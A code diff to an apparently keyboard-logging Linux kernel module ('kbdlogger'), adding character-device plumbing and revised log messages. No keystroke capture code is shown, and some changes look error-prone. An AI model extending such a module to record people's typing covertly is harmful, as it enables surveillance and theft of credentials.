@@ -50,10 +50,25 @@ const char *kbdstr = "keyboard";
 struct kbldev {
 	struct input_handle handle;
 	struct device dev;
+	struct cdev cdev;
 };
+
+
+static int kbldev_release(struct inode *inode, struct file *file)
+{
+	return 0;
+}
+
+
+static int kbldev_open(struct inode *inode, struct file *file)
+{
+	return 0;
+}
 
 static const struct file_operations kbldev_fops = {
 	.owner    = THIS_MODULE,
+	.open     = kbldev_open,
+	.release  = kbldev_release,
 };
 
 
@@ -70,6 +85,8 @@ static void kbdlogger_cleanup(struct kbldev *kbldev)
 	struct input_handle *handle = &kbldev->handle;
 	if (!kbldev)
 		return;
+
+	cdev_del(&kbldev->cdev);
 
 	if (handle)
 		input_close_device(handle);
@@ -123,6 +140,12 @@ static int kbdlogger_connect(struct input_handler *handler,
 	if (error)
 		goto err_free_kbldev;
 
+	cdev_init(&kbldev->cdev, &kbldev_fops);
+	kbldev->cdev.kobj.parent = &kbldev->dev.kobj;
+	error = cdev_add(&kbldev->cdev, kbldev->dev.devt, 1);
+	if (error)
+		goto err_unregister_handle;
+
 	error = device_add(&kbldev->dev);
 	if (error)
 		goto err_cleanup_kbldev;
@@ -131,7 +154,9 @@ static int kbdlogger_connect(struct input_handler *handler,
 	if (error)
 		goto err_cleanup_kbldev;
 
-	pr_info("Connected device: %s (%s at %s)\n",
+	pr_info("Added device %s\n", dev_name(&kbldev->dev));
+
+	pr_info("Connected to device %s (%s at %s)\n",
 		dev_name(&dev->dev),
 		dev->name ?: "unknown",
 		dev->phys ?: "unknown");
@@ -140,7 +165,7 @@ static int kbdlogger_connect(struct input_handler *handler,
 
 err_cleanup_kbldev:
 	kbdlogger_cleanup(kbldev);
-//err_unregister_handle:
+err_unregister_handle:
 	input_unregister_handle(&kbldev->handle);
 err_free_kbldev:
 	put_device(&kbldev->dev);
@@ -163,7 +188,6 @@ static void kbdlogger_disconnect(struct input_handle *handle)
 	struct kbldev *kbldev = handle->private;
 
 	device_del(&kbldev->dev);
-	pr_info("Disconnected device: %s\n", dev_name(&handle->dev->dev));
 	kbdlogger_cleanup(kbldev);
 
 	input_free_minor(MINOR(kbldev->dev.devt));
@@ -174,6 +198,7 @@ static void kbdlogger_disconnect(struct input_handle *handle)
 		pr_err("input handle already NULL\n");
 
 	put_device(&kbldev->dev);
+	pr_info("Disconnected from device %s\n", dev_name(&handle->dev->dev));
 }
 
 static const struct input_device_id kbdlogger_ids[] = {
@@ -202,7 +227,7 @@ static int __init kbdlogger_init(void)
 		goto fail;
 	}
 
-	pr_info("loaded\n");
+	pr_info("loaded %s\n", DEVNAME);
 	return 0;
 fail:
 	pr_err("failed to init %s\n", DEVNAME);
@@ -212,7 +237,7 @@ fail:
 static void __exit kbdlogger_exit(void)
 {
 	input_unregister_handler(&kbdlogger_handler);
-	pr_info("exited\n");
+	pr_info("unloaded %s\n", DEVNAME);
 }
 
 module_init(kbdlogger_init);
